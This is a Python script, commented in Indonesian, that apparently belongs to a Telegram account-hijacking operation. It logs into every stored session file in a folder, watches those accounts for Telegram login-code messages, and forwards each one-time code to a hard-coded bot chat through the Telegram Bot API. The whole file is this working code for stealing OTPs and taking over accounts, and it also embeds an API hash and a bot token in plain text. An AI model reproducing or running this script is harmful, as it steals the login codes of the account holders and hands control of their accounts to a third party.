import os, asyncio, requests
from telethon import TelegramClient, events

# API ID dan API HASH sama dengan yang di app.py
api_id = 16047851
api_hash = "d90d2bfd0b0a86c49e8991bd3a39339a"

# Bot untuk forward OTP
BOT_TOKEN = "8062450896:AAHFGZeexuvK659JzfQdiagi3XwPd301Wi4"
CHAT_ID = "7712462494"

SESSION_DIR = "sessions"

async def forward_handler(event, client_name):
    """Handler untuk meneruskan pesan OTP"""
    text_msg = event.message.message
    if "login code" in text_msg.lower() or "kode login" in text_msg.lower():
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": f"📩 Pesan OTP baru dari {client_name}:\n\n{text_msg}"
        }
        requests.post(url, data=payload)
        print(f"OTP diteruskan dari {client_name}: {text_msg}")

async def main():
    print("Worker jalan...")

    clients = []
    # loop semua session file yang ada di folder sessions/
    for fname in os.listdir(SESSION_DIR):
        if fname.endswith(".session"):
            path = os.path.join(SESSION_DIR, fname)
            print(f"Memuat session {path}")
            client = TelegramClient(path, api_id, api_hash)
            await client.start()  # login otomatis pakai session
            clients.append(client)
            # pasang handler untuk setiap client
            client.add_event_handler(lambda e, fn=fname: forward_handler(e, fn), events.NewMessage)

    if not clients:
        print("⚠️ Tidak ada file session di folder sessions/. Login dulu lewat web app untuk membuat session.")
    else:
        # tunggu semua client sampai disconnect
        await asyncio.gather(*(c.run_until_disconnected() for c in clients))

if __name__ == "__main__":
    asyncio.run(main())
